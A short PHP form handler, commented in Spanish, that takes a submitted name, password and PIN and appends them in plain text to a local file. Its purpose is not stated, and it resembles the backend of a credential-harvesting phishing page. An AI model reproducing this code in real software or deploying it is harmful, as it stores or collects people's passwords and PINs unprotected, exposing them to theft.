<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $nombre = $_POST["nombre"];
    $pass = $_POST["pass"];
    $nip = $_POST["nip"];

    // Abre o crea el archivo en modo escritura
    $archivo = fopen("datos_formulario.txt", "a");

    if ($archivo) {
        // Escribe los datos en el archivo
        fwrite($archivo, "Nombre: " . $nombre . "\n");
        fwrite($archivo, "contrasena: " . $pass . "\n");
        fwrite($archivo, "nip: " . $nip . "\n");

        // Cierra el archivo
        fclose($archivo);

        echo "Datos del formulario guardados correctamente.";
    } else {
        echo "Error al abrir el archivo.";
    }
} else {
    echo "Error: Acceso no válido.";
}
?>

